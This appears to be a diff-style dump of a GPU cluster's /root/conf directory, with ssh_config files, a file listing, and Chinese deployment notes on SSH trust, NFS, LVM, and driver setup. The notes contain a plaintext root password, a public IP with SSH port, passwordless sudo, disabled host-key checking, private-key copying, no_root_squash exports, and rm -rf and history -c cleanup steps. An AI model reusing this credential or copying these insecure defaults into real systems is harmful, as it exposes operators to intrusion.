+#   IdentityFile ~/.ssh/id_rsa
+#   IdentityFile ~/.ssh/id_dsa
+#   IdentityFile ~/.ssh/id_ecdsa
+#   IdentityFile ~/.ssh/id_ed25519
+#   Port 22
+#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc
+#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com
+#   EscapeChar ~
+#   Tunnel no
+#   TunnelDevice any:any
+#   PermitLocalCommand no
+#   VisualHostKey no
+#   ProxyCommand ssh -q -W %h:%p gateway.example.com
+#   RekeyLimit 1G 1h
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+===== /root/conf/ssh_rsa/ssh_config (1600B)
+
+# This is the ssh client system-wide configuration file.  See
+# ssh_config(5) for more information.  This file provides defaults for
+# users, and the values can be changed in per-user configuration files
+# or on the command line.
+
+# Configuration data is parsed as follows:
+#  1. command line options
+#  2. user-specific file
+#  3. system-wide file
+# Any configuration value is only changed the first time it is set.
+# Thus, host-specific definitions should be at the beginning of the
+# configuration file, and defaults at the end.
+
+# Site-wide defaults for some commonly used options.  For a comprehensive
+# list of available options, their meanings and defaults, please see the
+# ssh_config(5) man page.
+
+#Include /etc/ssh/ssh_config.d/*.conf
+
+Host *
+#   ForwardAgent no
+#   ForwardX11 no
+#   ForwardX11Trusted yes
+   PasswordAuthentication no
+#   HostbasedAuthentication no
+#   GSSAPIAuthentication no
+#   GSSAPIDelegateCredentials no
+#   GSSAPIKeyExchange no
+#   GSSAPITrustDNS no
+#   BatchMode no
+#   CheckHostIP yes
+#   AddressFamily any
+#   ConnectTimeout 0
+   StrictHostKeyChecking no
+#   IdentityFile ~/.ssh/id_rsa
+#   IdentityFile ~/.ssh/id_dsa
+#   IdentityFile ~/.ssh/id_ecdsa
+#   IdentityFile ~/.ssh/id_ed25519
+#   Port 22
+#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc
+#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com
+#   EscapeChar ~
+#   Tunnel no
+#   TunnelDevice any:any
+#   PermitLocalCommand no
+#   VisualHostKey no
+#   ProxyCommand ssh -q -W %h:%p gateway.example.com
+#   RekeyLimit 1G 1h
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+===== /root/conf/ubuntu_rsa/ssh_config (1600B)
+
+# This is the ssh client system-wide configuration file.  See
+# ssh_config(5) for more information.  This file provides defaults for
+# users, and the values can be changed in per-user configuration files
+# or on the command line.
+
+# Configuration data is parsed as follows:
+#  1. command line options
+#  2. user-specific file
+#  3. system-wide file
+# Any configuration value is only changed the first time it is set.
+# Thus, host-specific definitions should be at the beginning of the
+# configuration file, and defaults at the end.
+
+# Site-wide defaults for some commonly used options.  For a comprehensive
+# list of available options, their meanings and defaults, please see the
+# ssh_config(5) man page.
+
+#Include /etc/ssh/ssh_config.d/*.conf
+
+Host *
+#   ForwardAgent no
+#   ForwardX11 no
+#   ForwardX11Trusted yes
+   PasswordAuthentication no
+#   HostbasedAuthentication no
+#   GSSAPIAuthentication no
+#   GSSAPIDelegateCredentials no
+#   GSSAPIKeyExchange no
+#   GSSAPITrustDNS no
+#   BatchMode no
+#   CheckHostIP yes
+#   AddressFamily any
+#   ConnectTimeout 0
+   StrictHostKeyChecking no
+#   IdentityFile ~/.ssh/id_rsa
+#   IdentityFile ~/.ssh/id_dsa
+#   IdentityFile ~/.ssh/id_ecdsa
+#   IdentityFile ~/.ssh/id_ed25519
+#   Port 22
+#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc
+#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com
+#   EscapeChar ~
+#   Tunnel no
+#   TunnelDevice any:any
+#   PermitLocalCommand no
+#   VisualHostKey no
+#   ProxyCommand ssh -q -W %h:%p gateway.example.com
+#   RekeyLimit 1G 1h
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+-- conf listing
+/root/conf:
+total 12740
+drwxr-xr-x 10 root root    4096 Apr 18  2026 .
+drwx------ 34 root root    4096 Nov 25 05:23 ..
+drwxr-xr-x  2 root root    4096 Apr 18  2026 .Temp
+drwxr-xr-x  3 root root    4096 Apr 18  2026 .tmp
+-rwxr-xr-x  1 root root     168 Apr 18  2026 10periodic
+-rwxr-xr-x  1 root root    3115 Apr 18  2026 1to1_nccl_tests.sh
+-rwxr-xr-x  1 root root     169 Apr 18  2026 20auto-upgrades
+-rwxr-xr-x  1 root root    1656 Apr 18  2026 CentOS-Base.repo
+-rwxr-xr-x  1 root root    1989 Apr 18  2026 IB_HCA_check.sh
+-rwxr-xr-x  1 root root     315 Apr 18  2026 acs_check.sh
+-rwxr-xr-x  1 root root     108 Apr 18  2026 addiptoyaml.txt
+-rwxr-xr-x  1 root root    1616 Apr 18  2026 b200_ceph_storage_mount.sh
+-rwxr-xr-x  1 root root    7834 Apr 18  2026 batch_install.sh
+-rwxr-xr-x  1 root root     602 Apr 18  2026 batch_sn.sh
+-rwxr-xr-x  1 root root     766 Apr 18  2026 bios.sh
+-rwxr-xr-x  1 root root    1625 Apr 18  2026 blacklist.conf
+-rwxr-xr-x  1 root root     720 Apr 18  2026 centos_softinstall.sh
+-rwxr-xr-x  1 root root     769 Apr 18  2026 change_hostname.sh
+-rwxr-xr-x  1 root root    6525 Apr 18  2026 check.sh
+-rwxr-xr-x  1 root root    1403 Apr 18  2026 check_nodes.sh
+-rwxr-xr-x  1 root root    8822 Apr 18  2026 chengdu_部署步骤.md
+-rwxr-xr-x  1 root root     568 Apr 18  2026 clean.sh
+-rwxr-xr-x  1 root root    1878 Apr 18  2026 collect_gpu_diag.sh
+-rwxr-xr-x  1 root root      69 Apr 18  2026 config
+-rwxr-xr-x  1 root root     631 Apr 18  2026 cpu_performance.sh
+-rwxr-xr-x  1 root root    1376 Apr 18  2026 cpu_performance_centos.sh
+-rwxr-xr-x  1 root root     959 Apr 18  2026 cuda.sh
+-rwxr-xr-x  1 root root    2630 Apr 18  2026 deploy_fl_container.sh.sh
+-rwxr-xr-x  1 root root    1293 Apr 18  2026 disable_chaojubiain_acs.sh
+-rwxr-xr-x  1 root root    1223 Apr 18  2026 disable_chaowei_acs.sh
+-rwxr-xr-x  1 root root    1421 Apr 18  2026 disable_ningchang_acs.sh
+-rwxr-xr-x  1 root root     224 Apr 18  2026 disablenouveau.sh
+-rwxr-xr-x  1 root root    3775 Apr 18  2026 disableupdate.sh
+-rwxr-xr-x  1 root root    2333 Apr 18  2026 docker-install.yml
+-rwxr-xr-x  1 root root    1139 Apr 18  2026 docker.sh
+-rwxr-xr-x  1 root root    3909 Apr 18  2026 download_huggingfacemodel_B200_batch.sh
+-rwxr-xr-x  1 root root    1139 Apr 18  2026 elbencho-storage-test.sh
+-rwxr-xr-x  1 root root    1062 Apr 18  2026 env.sh
+-rwxr-xr-x  1 root root    1466 Apr 18  2026 fio-parallel.sh
+-rwxr-xr-x  1 root root    1277 Apr 18  2026 fio-single.sh
+-rwxr-xr-x  1 root root    4282 Apr 18  2026 full-comfile.sh
+drwxr-xr-x  2 root root    4096 Apr 18  2026 gpu_burn
+-rwxr-xr-x  1 root root     353 Apr 18  2026 gpu_lspci_info.sh
+-rwxr-xr-x  1 root root    1105 Apr 18  2026 grub.sh
+-rwxr-xr-x  1 root root     186 Apr 18  2026 h800_os_bugcollect.sh
+-rwxr-xr-x  1 root root     223 Apr 18  2026 h800_share_storage.sh
+-rwxr-xr-x  1 root root    9434 Apr 18  2026 hamiaotong_ubuntu_batch_install.sh
+-rwxr-xr-x  1 root root    9832 Apr 18  2026 health-check-v2.sh
+-rwxr-xr-x  1 root root     309 Apr 18  2026 health_check.sh
+-rwxr-xr-x  1 root root      42 Apr 18  2026 hostlist
+-rwxr-xr-x  1 root root     510 Apr 18  2026 hostname.sh
+-rwxr-xr-x  1 root root    1296 Apr 18  2026 hosts
+-rwxr-xr-x  1 root root 2826240 Apr 18  2026 ib_test.tar
+-rwxr-xr-x  1 root root   92887 Apr 18  2026 ib_test_log.txt
+-rwxr-xr-x  1 root root    2016 Apr 18  2026 ib_write_test.sh
+-rwxr-xr-x  1 root root    1268 Apr 18  2026 ids.sh
+-rwxr-xr-x  1 root root    1858 Apr 18  2026 install-docker.sh
+-rwxr-xr-x  1 root root     208 Apr 18  2026 install_all_1.sh
+-rwxr-xr-x  1 root root      85 Apr 18  2026 install_all_2.sh
+-rwxr-xr-x  1 root root     708 Apr 18  2026 install_build_essential.sh
+-rwxr-xr-x  1 root root    8772 Apr 18  2026 installnvidiadriver.sh
+-rwxr-xr-x  1 root root    1073 Apr 18  2026 installofed.sh
+-rwxr-xr-x  1 root root     560 Apr 18  2026 installpackage.sh
+-rwxr-xr-x  1 root root     315 Apr 18  2026 ip_hostname_to_hosts.sh
+-rwxr-xr-x  1 root root     306 Apr 18  2026 keygen.sh
+-rwxr-xr-x  1 root root     670 Apr 18  2026 kgzs_copy_id_rsa.sh
+-rwxr-xr-x  1 root root     618 Apr 18  2026 kill_dpkg_apt.sh
+-rwxr-xr-x  1 root root    2548 Apr 18  2026 limits.conf
+-rwxr-xr-x  1 root root     739 Apr 18  2026 mianmi.txt
+-rwxr-xr-x  1 root root     164 Apr 18  2026 module.sh
+drwxr-xr-x  4 root root    4096 Apr 18  2026 modulefiles
+-rwxr-xr-x  1 root root    1213 Apr 18  2026 monitor_nvlink.sh
+-rwxr-xr-x  1 root root    1223 Apr 18  2026 monitor_pcie.sh
+-rwxr-xr-x  1 root root     792 Apr 18  2026 mount.sh
+-rwxr-xr-x  1 root root     356 Apr 18  2026 mountnfs.sh
+-rwxr-xr-x  1 root root     683 Apr 18  2026 mpi.sh
+-rwxr-xr-x  1 root root    4026 Apr 18  2026 multi_trans.sh
+-rwxr-xr-x  1 root root    4015 Apr 18  2026 multitrans.sh
+-rwxr-xr-x  1 root root     249 Apr 18  2026 nccl-tests.sh
+-rwxr-xr-x  1 root root     148 Apr 18  2026 nccl.sh
+drwxr-xr-x  3 root root    4096 Apr 18  2026 nccl_test
+-rwxr-xr-x  1 root root    1292 Apr 18  2026 net-tools.sh
+-rwxr-xr-x  1 root root      48 Apr 18  2026 nolinuxupgrades
+-rwxr-xr-x  1 root root     780 Apr 18  2026 nv_gpu_conf.sh
+-rwxr-xr-x  1 root root    1049 Apr 18  2026 nvidia-container-toolkit.sh
+-rwxr-xr-x  1 root root     193 Apr 18  2026 nvidia.sh
+-rwxr-xr-x  1 root root 6779434 Apr 18  2026 nvlsm_2025.03.1-1_amd64.deb
+-rwxr-xr-x  1 root root    4421 Apr 18  2026 openmpi缂栬瘧浠ュ強modulefiles缂栧啓.md
+-rwxr-xr-x  1 root root    4421 Apr 18  2026 openmpi编译以及modulefiles编写.md
+-rwxr-xr-x  1 root root    5912 Apr 18  2026 pair_batch_nccl-tests.sh
+-rwxr-xr-x  1 root root     373 Apr 18  2026 para_copy.sh
+-rwxr-xr-x  1 root root     210 Apr 18  2026 para_scp.sh
+-rwxr-xr-x  1 root root     989 Apr 18  2026 para_ssh.sh
+-rwxr-xr-x  1 root root     191 Apr 18  2026 pass.sh
+-rwxr-xr-x  1 root root     348 Apr 18  2026 pcie.sh
+-rwxr-xr-x  1 root root    7559 Apr 18  2026 prefetch.sh
+-rwxr-xr-x  1 root root    2078 Apr 18  2026 progress.sh
+-rwxr-xr-x  1 root root    1242 Apr 18  2026 raid10.sh
+-rwxr-xr-x  1 root root    1788 Apr 18  2026 raid5.sh
+-rwxr-xr-x  1 root root     469 Apr 18  2026 rc.local
+-rwxr-xr-x  1 root root    2957 Apr 18  2026 rc_chengdu.local
+-rwxr-xr-x  1 root root     626 Apr 18  2026 rclocal.sh
+-rwxr-xr-x  1 root root     572 Apr 18  2026 rclocal_chaojubian.sh
+-rwxr-xr-x  1 root root    8267 Apr 18  2026 root_batch_install.sh
+-rwxr-xr-x  1 root root     663 Apr 18  2026 root_copy_id_rsa.sh
+drwxr-xr-x  2 root root    4096 Apr 18  2026 root_rsa
+-rwxr-xr-x  1 root root    1806 Apr 18  2026 rsync-local2local.sh
+-rwxr-xr-x  1 root root     427 Apr 18  2026 set-hostname.sh
+-rwxr-xr-x  1 root root    1268 Apr 18  2026 set_sudonopasswd.sh
+-rwxr-xr-x  1 root root     578 Apr 18  2026 single.sh
+-rwxr-xr-x  1 root root     854 Apr 18  2026 ssh-ssh.sh
+-rwxr-xr-x  1 root root     649 Apr 18  2026 ssh.sh
+-rwxr-xr-x  1 root root    1648 Apr 18  2026 ssh_config
+drwxr-xr-x  2 root root    4096 Apr 18  2026 ssh_rsa
+-rwxr-xr-x  1 root root    3269 Apr 18  2026 sshd_config
+-rwxr-xr-x  1 root root    4855 Apr 18  2026 step_verify(2).sh
+-rwxr-xr-x  1 root root      44 Apr 18  2026 synchosts.sh
+-rwxr-xr-x  1 root root      89 Apr 18  2026 syncrclocal.sh
+### DOCX
+===== /root/conf/ubuntu闆嗙兢閮ㄧ讲.docx (649208B)
+1、配置/etc/hosts
+2、配置ssh互信
+ssh-keygen -t rsa
+cp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys
+scp ~/.ssh g0001:~
+3、配置ubuntu用户sudo 不要密码
+ubuntu    ALL=(ALL:ALL)  NOPASSWD: ALL
+创建一个主机名列表文件hostlist
+4、设置主机名
+for i in `cat hostlist` ; do ssh $i &quot;sudo hostnamectl set-hostname $i&quot; ;done
+5、挂盘
+pvcreate /dev/nvme0n1
+pvcreate /dev/nvme1n1
+pvcreate /dev/nvme2n1
+pvcreate /dev/nvme3n1
+创建物理卷
+vgcreate vg1 /dev/nvme0n1 /dev/nvme1n1 /dev/nvme2n1 /dev/nvme3n1
+创建一个vg1卷组名，并把/dev/nvme0n1 /dev/nvme1n1 /dev/nvme2n1 /dev/nvme3n1物理卷加入其中。
+lvcreate -l 100%VG -n lv1 vg1
+这个含义是创建新的lv1,把所有的vg1划给1个lv1，并取名lv1。
+参考链接:https://blog.csdn.net/wangsong_it/article/details/107509170
+mkfs.ext4 /dev/mapper/vg1-lv1
+格式化，并创建ext4文件系统
+条带化：
+lvcreate -l 100%VG -i 2 -I 8 -n lv1 vg1
+mkdir /ssd
+vim /etc/fstab
+/dev/mapper/vg1-lv1 /ssd ext4  defaults,errors=remount-ro  0 0
+mount -a
+ssd盘挂到ssd目录
+6、配置NFS server
+在g0001执行
+sudo apt-get -y install nfs-kernel-server
+mkdir /ssd/apps
+sudo vim /etc/exports
+/ssd/apps 10.31.17.0/25(rw,no_root_squash,insecure,sync)
+sudo /etc/init.d/rpcbind restart
+sudo /etc/init.d/nfs-kernel-server restart
+sudo systemctl start  nfs-server
+sudo systemctl enable nfs-server
+sudo systemctl status nfs-server
+如果在客户端出现这种stale file handle情况，可以在服务端重新启动nfs服务：
+sudo /etc/init.d/rpcbind restart
+sudo /etc/init.d/nfs-kernel-server restart
+造成这种原因是，服务端机器重启过，但是重启前没有umount共享盘
+验证：
+sudo showmount -e
+注意：如果是新增节点要挂载，需要先将新增节点补充到/etc/exports里面，再执行exportfs -ra (重新加载配置)刷新下配置)。
+然后到在服务端批量执行for i in `cat hostlist-new`;do ssh $i &quot;mount 172.16.10.11:/ssd/run /root/run&quot;;done
+这里的172.16.10.11是服务端IP
+客户端挂载：
+#!/bin/bash
+apt -y install nfs-common
+mkdir -p /data/apps
+mount -t nfs -o vers=3,nolock,proto=tcp,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport 10.31.17.2:/ssd/apps /data/apps
+#echo &quot;mount -t nfs -o vers=3,nolock,proto=tcp,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport 10.31.17.2:/ssd/apps /data/apps&quot; >> /etc/rc.local
+Noresvport 存在的目的是为了可以避免网络闪断导致 nfs hang 住，请注意，如果后面有了Noresvport前面也需要有insecure存在，否则会出现权限问题。
+sudo-t nfs -o
+挂载将NFS协议的网络文件系统以硬盘形式挂载
+vers=
+NFS客户端版本
+proto=tcp
+以TCP网络形式连接，相较于UDP更可靠
+rsize=1048576
+在NFS服务器读取文件时NFS使用的字节数，默认值是1024个字节，最大1048576字节， 该值越大，向服务器发送的请求包越少，性能越高。
+wsize=1048576
+向NFS服务器写文件时NFS使用的字节数 默认值是1024个字节，最大1048576字节，该值越大，向服务器发送的请求包越少，性能越高。
+hard
+使用硬挂载的方式挂载系统 ，重复请求直到NFS服务器回应。；适用于不希望业务由于网络延迟或服务器服务重启或短暂的过载等情况而中断场景
+timeo=600
+对于基于TCP的NFS服务，默认等待重传时间为60s ，数据越大，持续重传的时间越长，可减少数据传输失败概率。
+retrans=2
+客户端返回错误前的重传次数。默认为重传3次。
+noresvport
+该参数将在后端NFS失效情况下进行持续性重连，适用于联通云服务高可用场景
+mount_path
+文件系统提供的挂载点，为在文件存储控制台-文件系统列表/相应文件系统详情页面中获取挂载点信息，某些场景下使用根目录进行挂载可能存在问题，可以于“mount_path”后添加“/share”路径进行挂载。
+/mnt
+将文件系统挂载的目录
+智谱批量执行示例：
+pdsh -R ssh -w g[0001-0046] &quot;sudo sh -c 'echo sudo mount -t nfs -o vers=3,nolock,proto=tcp,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport 10.254.27.100:/volume1/data /nas1 >> /etc/fstab'&quot;
+pdsh -R ssh -w g[0001-0046] &quot;sudo sh -c 'echo sudo mount -t nfs -o vers=3,nolock,proto=tcp,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport 10.254.27.101:/volume1/data /nas2 >> /etc/fstab'&quot;
+如果出现这个报错：Mount failed with mount: mount.nfs: access denied by server while mounting error
+可能有以下原因：
+1、/etc/exports 里面insecure 和 rc.local里面mount -t nfs -o vers=3,nolock,proto=tcp,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport 10.31.17.2:/ssd/apps /data/apps 没有成对出现，如果是因为这个原因，可以把2者都取消，或者都写上，增减参数后，记得执行exportfs -ra，再systemctl restart rc-local.service 以及systemctl status rc-local.service，如果不奏效，直接mount -t nfs -o vers=3,nolock,proto=tcp,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2 10.31.17.2:/ssd/apps /data/apps
+2、还有一个原因就是，看10.31.17.2:/ssd/apps /data/apps 里面，目录顺序是否弄反了。
+批量执行：
+for i in cat hostlist ; do scp mountnfs.sh $i:~/ ;done
+for i in cat hostlist ; do (  ssh $i  &quot;sudo ~/mountnfs.sh&quot; &);done
+7、同步/etc/hosts
+for i in `cat hostlist` ; do ( ssh $i &quot;sudo /data/apps/conf/synchosts.sh&quot; & );done
+8、配置rc.local
+将rc.local 放到共享目录下面路径 /data/apps/conf/rc.local
+#!/bin/bash
+echo &quot;&quot; >> /lib/systemd/system/rc-local.service
+echo &quot;[Install]&quot; >> /lib/systemd/system/rc-local.service
+echo &quot;WantedBy=multi-user.target&quot; >> /lib/systemd/system/rc-local.service
+#echo -e '#!/bin/bash\n' | cat - /etc/rc.local > temp && mv temp /etc/rc.local
+cp /data/apps/conf/rc.local /etc/rc.local
+chmod 755 /etc/rc.local
+systemctl daemon-reload
+systemctl restart rc-local.service  #如果是用到IB网络，需要注意
+systemctl enable rc-local.service
+systemctl status rc-local.service
+批量执行
+for i in `cat hostlist` ; do ssh $i &quot;sudo /data/apps/conf/rclocal.sh&quot; ;done
+更新rc.local 
+for i in cat hostlist ; do ( ssh $i &quot;sudo /data/apps/conf/syncrclocal.sh&quot; & ) ;done
+9、关闭内核更新并检查内核版本
+uname -a
+如果和其它机器不一致，同步为一致的内核版本。
+for i in `cat hostlist` ; do ssh $i  &quot;uname -a&quot; ;done
+升级内核到指定版本：
+升级内核前注意删除nvidia驱动和IB驱动。
+apt-get upgrade linux-image-5.15.0-76-generic
+升级内核重启后如果出现无法进入系统，卡在（initramfs） 提示UUID  xxx does not exist
+进入单用户模式或者救援模式，挂上盘这里/dev/sda3是/ /dev/sda2是/boot
+sudo mount /dev/sda3 /mnt
+sudo mount /dev/sda2 /mnt/boot
+sudo mount --bind /dev /mnt/dev
+sudo mount --bind /sys /mnt/sys
+sudo mount --bind /proc /mnt/proc
+sudo chroot /mnt
+修复grub bootloader
+grub-mkconfig
+update-grub
+更新initramdisk
+update-initramfs -k 5.15.0-76-generic -u
+10.关闭自动更新
+for i in cat hostlist ; do ( ssh $i &quot; sudo /data/apps/conf/disableupdate.sh&quot; & ) ;done
+11.ssh配置
+for i in cat hostlist ; do ( ssh $i &quot;sudo /data/apps/conf/ssh.sh&quot; & );done
+12、安装必要的包
+for i in cat hostlist ; do ( ssh $i &quot;sudo /data/apps/conf/installpackage.sh&quot; & );done
+升级内核后以前装的依赖包都用不了了需要reinstall重新安装一遍，要不然安装ib驱动会提示缺少依赖
+apt-get install environment-modules 这个需要module时，需要安装。如果是centos 则执行yum install environment-modules
+将modulefiles路径加到/usr/share/modules/init/.modulespath (for ubuntu)
+/usr/share/Modules/init/.modulespath (for centos7.9)
+最后source /usr/share/modules/init/profile.sh （for ubuntu）
+source /usr/share/Modules/init/bash_completion (for centos)
+13、禁用nouveau
+for i in cat hostlist ; do ( ssh $i &quot;sudo /data/apps/disblenouveau.sh&quot; & );done
+14、安装IB驱动
+for i in cat hostlist ; do ( ssh $i &quot;sudo /data/apps/conf/installofed.sh&quot; & );done
+下载方式参考链接： HYPERLINK &quot;https://enterprise-support.nvidia.com/s/article/howto-install-mlnx-ofed-driver#:~:text=Get%20the%20MLNX_OFED%20version%20from,%2D.tgz%20.&quot; https://enterprise-support.nvidia.com/s/article/howto-install-mlnx-ofed-driver#:~:text=Get%20the%20MLNX_OFED%20version%20from,%2D.tgz%20.比如：MLNX_OFED_LINUX-24.04-0.7.0.0-ubuntu22.04-x86_64.tgz下载方式：wget http://www.mellanox.com/downloads/ofed/MLNX_OFED-24.04-0.7.0.0/MLNX_OFED_LINUX-24.04-0.7.0.0-ubuntu22.04-x86_64.tgz
+15、安装nvidia 驱动
+for i in cat hostlist ; do ( ssh $i &quot;sudo /data/apps/installnvidiadriver.sh&quot; & );done
+新机器一键安装
+先执行install_all_1.sh
+重启reboot
+再执行install_all_2.sh
+openmpi安装遇到报错
+WARNING: 'automake-1.15' is missing on your system. You should only need it if you modified 'Makefile.am' or 'configure.ac' or m4 files included by 'configure.ac'. The 'automake' program is part of the GNU Automake package: <http://www.gnu.org/software/automake> It also requires GNU Autoconf, GNU m4 and Perl in order to run: <http://www.gnu.org/software/autoconf> <http://www.gnu.org/software/m4/> <http://www.perl.org/> make: *** [Makefile.in] Error 1
+解决办法：先autoreconf -fiv，然后再configure
+参考链接： HYPERLINK &quot;https://cloud.tencent.com/developer/ask/sof/106454349/answer/105971431&quot; https://cloud.tencent.com/developer/ask/sof/106454349/answer/105971431
+Option package-version requires an argument
+Usage: ../../../config/make_manpage.pl --package-name=<package name> --package-version=<package version> --ompi-date=<ompi date> --opal-date=<opal date> --orte-date=<orte date> --input=<input file> --output=<output file> [--nocxx] [ --nofortran] [--nof08]
+make[2]: *** [opal_crs.7] Error 1
+make[2]: *** Waiting for unfinished jobs....
+make[2]: Leaving directory `/mnt/nfs/zhou/openmpi-4.1.5/opal/mca/crs'
+make[1]: *** [all-recursive] Error 1
+make[1]: Leaving directory `/mnt/nfs/zhou/openmpi-4.1.5/opal'
+make: *** [all-recursive] Error 1
+解决办法：在configure里面第593和594行添加版本号
+参考链接： HYPERLINK &quot;https://blog.csdn.net/weixin_40501169/article/details/119347380&quot; https://blog.csdn.net/weixin_40501169/article/details/119347380
+集群清理复用步骤
+1、彻底删除共享目录及其家目录下面的原始数据，部署的软件除外
+删除conda虚拟环境
+history -c #删除history记录
+3.1、执行ls -al，查看隐藏文件及目录，删掉除.ssh外的所有隐藏文件和目录，
+执行以下命令：
+删除隐藏文件夹: find . -maxdepth 1 -type d -name &quot;.*&quot; ! -name &quot;.ssh&quot; -exec rm -rf {} \;
+删除隐藏文件: find . -maxdepth 1 -type f -name &quot;.*&quot; ! -name &quot;.ssh&quot; -exec rm -rf {} \;
+cp /etc/skel/.* .  
+修改密码
+执行apt-get install pwgen来安装自动密码生成器
+pwgen -cy -1 -n 15 16 密码位数较长
+选择新密码：ij2gooDe^y
+在g0278上依次执行下列命令：
+sudo passwd ubuntu  #修改乌班图密码，然后输入新密码
+sudo passwd #修改root密码，跟乌班图密码保持一致
+接下来ssh g0284上
+sudo passwd ubuntu  #修改乌班图密码，然后输入新密码，同g0278
+sudo passwd #修改root密码，跟乌班图密码保持一致，同g0278
+注意：如果有个节点/etc/ssh/sshd_config里面禁止密码登录，那么需要在拷贝.ssh前将文件里面的PasswordAuthentication no 改为PasswordAuthentication yes，然后执行service ssh restart 重启ssh服务，使之生效，再进行密钥拷贝操作（免密操作），拷贝完成后，再修改sshd_config，改回来，再重启ssh服务，就可以了
+参考链接：https://blog.csdn.net/qq_32506245/article/details/81355497
+5、重置密钥
+ssh-keygen
+问是否选择覆盖，选y
+接下来就是默认回车即可
+cp id_rsa.pub authorized_keys
+scp -r ~/.ssh g0284:~
+6、验证
+ssh g0284 可以很顺利跳转过去
+7、在N37分区如何换新密钥
+例如：我需要将g0010的新秘钥给批量拷贝到其他节点上去，可以先把其他节点的旧密钥拷贝到g0010家目录下，然后执行：
+scp -i id_rsa -rp ~/.ssh 172.16.13.24:/root
+前提是/etc/hosts里面有这个节点内网IP和节点名，否则会报没有这个hostname
+8、在37分区如何通过公网传输文件
+scp -P 52014 -i id_rsa NVIDIA-Linux-x86_64-535.129.03.run  HYPERLINK &quot;mailto:root@175.102.135.162:/data/apps&quot; root@175.102.135.162:/data/apps
+那是否可以通过内网传输呢？
+例如：动物所机器对应的公网IP和哈工大的公网IP不是同一个，意味着他们的VPC不一样，故内网也不通，不能通过内网传输文件
+9、降低内核版本方式
+sudo  vim /etc/default/grub
+修改 GRUB_DEFAULT=&quot;1> 2&quot;
+sudo  update-grub
+解决waiting for cache lock: Could not get lock /var/lib/dpkg/lock-frontend. It is held by process 99415 (apt)... 12s问题
+参考链接： HYPERLINK &quot;https://www.zhihu.com/question/590708259&quot; https://www.zhihu.com/question/590708259
+1、删除apt进程
+ps aux | grep -i apt
+2、删除锁文件
+rm /var/lib/apt/lists/lock
+rm /var/lib/dpkg/lock-frontend
+rm /var/cache/apt/archives/lock
+rm /var/lib/dpkg/lock
+3、解决centos安装驱动的报错问题，报错如下：
+ERROR: Unable to find the kernel source tree for the currently running kernel.  Please make sure you have installed the kernel source files for your kernel and that they are properly configured; on Red Hat Linux systems, for example, be sure you have the 'kernel-source' or 'kernel-devel' RPM installed.  If you know the correct kernel source files are installed, you may specify the kernel source path with the '--kernel-source-path' command line option.
+解决方案：yum install &quot;kernel-devel-uname-r == $(uname -r)&quot; -y
+参考链接： HYPERLINK &quot;https://blog.csdn.net/weixin_42939529/article/details/130153922&quot; https://blog.csdn.net/weixin_42939529/article/details/130153922
+4、执行/etc/init.d/openibd restart报错处理办法
+===== /root/conf/ubuntu集群部署.docx (994193B)
+1、配置/etc/hosts
+2、配置ssh互信
+ssh-keygen -t rsa
+cp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys
+scp ~/.ssh g0001:~
+3、配置ubuntu用户sudo 不要密码
+ubuntu    ALL=(ALL:ALL)  NOPASSWD: ALL
+创建一个主机名列表文件hostlist
+4、设置主机名
+for i in `cat hostlist` ; do ssh $i &quot;sudo hostnamectl set-hostname $i&quot; ;done
+5、挂盘
+pvcreate /dev/nvme0n1
+pvcreate /dev/nvme1n1
+pvcreate /dev/nvme2n1
+pvcreate /dev/nvme3n1
+创建物理卷
+vgcreate vg1 /dev/nvme0n1 /dev/nvme1n1 /dev/nvme2n1 /dev/nvme3n1
+创建一个vg1卷组名，并把/dev/nvme0n1 /dev/nvme1n1 /dev/nvme2n1 /dev/nvme3n1物理卷加入其中。
+lvcreate -l 100%VG -i 2 -I 8 -n lv1 vg1 这个含义是创建新的lv1,把所有的vg1划给1个lv1，并取名lv1，另外还有创建条带化逻辑卷（启用 -i 和 -I 参数）功能，-i 2：条带数量为 2，-I 8：条带大小为 8KB（可根据需求调整，例如 64KB 适合大文件）。
+参考链接:https://blog.csdn.net/wangsong_it/article/details/107509170
+lvs -o +devices,stripes 查看逻辑卷详细信息（关注 #Str 和条带设备）
+#Str（条带数）应为 2Devices 应显示两个物理卷（如 nvme0n1 和 nvme1n1）
+格式化，并创建ext4文件系统mkfs.ext4 /dev/mapper/vg1-lv1
+挂载到/ssd目录
+mkdir /ssd
+vim /etc/fstab
+/dev/mapper/vg1-lv1 /ssd ext4  defaults,errors=remount-ro  0 0
+mount -a
+ssd盘挂到ssd目录
+后续加盘扩容
+pvcreate /dev/nvme2n1      # 初始化新磁盘为物理卷
+vgextend vg1 /dev/nvme2n1 # 将新物理卷加入卷组lvextend -i 2 -I 8 -l +100%FREE /dev/vg1/lv1 #扩展逻辑卷，必须保持与原逻辑卷相同的条带数（-i 2）和条带大小（-I 8），否则扩展会失败
+resize2fs /dev/mapper/vg1-lv1  # 调整 ext4 文件系统大小
+6、配置NFS server
+在g0001执行
+sudo apt-get -y install nfs-kernel-server
+mkdir /ssd/apps
+sudo vim /etc/exports
+/ssd/apps 10.31.17.0/25(rw,no_root_squash,insecure,sync)
+sudo /etc/init.d/rpcbind restart
+sudo /etc/init.d/nfs-kernel-server restart
+sudo systemctl start  nfs-server
+sudo systemctl enable nfs-server
+sudo systemctl status nfs-server
+如果在客户端出现这种stale file handle情况，可以在服务端重新启动nfs服务：
+sudo /etc/init.d/rpcbind restart
+sudo /etc/init.d/nfs-kernel-server restart
+造成这种原因是，服务端机器重启过，但是重启前没有umount共享盘
+验证：
+sudo showmount -e
